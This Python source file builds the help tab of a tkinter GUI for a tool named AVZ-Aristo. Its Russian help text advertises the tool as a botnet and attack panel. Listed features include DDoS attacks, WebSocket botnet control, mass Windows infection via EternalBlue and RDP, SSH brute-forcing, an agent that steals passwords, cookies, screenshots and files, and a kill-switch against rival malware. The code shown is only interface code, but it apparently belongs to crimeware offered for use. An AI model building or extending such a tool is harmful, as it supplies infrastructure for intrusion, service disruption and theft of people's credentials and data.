import tkinter as tk
from tkinter import scrolledtext
import json

class HelpTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.build_ui()

    def build_ui(self):
        self.text = scrolledtext.ScrolledText(self, wrap=tk.WORD, width=80, height=30)
        self.text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.load_help()

    def load_help(self):
        try:
            with open("version.json", "r") as f:
                version = json.load(f).get("version", "unknown")
        except:
            version = "unknown"
        help_text = f"""
AVZ-Aristo v{version}

Основные возможности:
- L4/L7 DDoS атаки (UDP, TCP, Slowloris, HTTP, HTTP/2, DNS Amplification, Smart)
- Ботнет с управлением через WebSocket
- Массовое заражение Windows (EternalBlue, RDP)
- Усиленный SSH-брутфорс (1000+ паролей)
- Многоуровневая проксификация (Tor + Spyderproxy)
- Агент-мародёр (сбор паролей, куки, скриншотов, файлов по маске)
- Защита от конкурентов (килл-свитч)
- Тепловая карта заражённых устройств
- Автоматическое распределение атак по мощности ботов
- Планировщик атак (cron)
- Разведка цели (whois, DNS, порты, SSL, HTTP заголовки)
- Удобный GUI с темами

Для получения подробной информации обратитесь к мастер-файлу AVZ_MASTER_REFERENCE.md
"""
        self.text.insert(tk.END, help_text)
        self.text.config(state=tk.DISABLED)
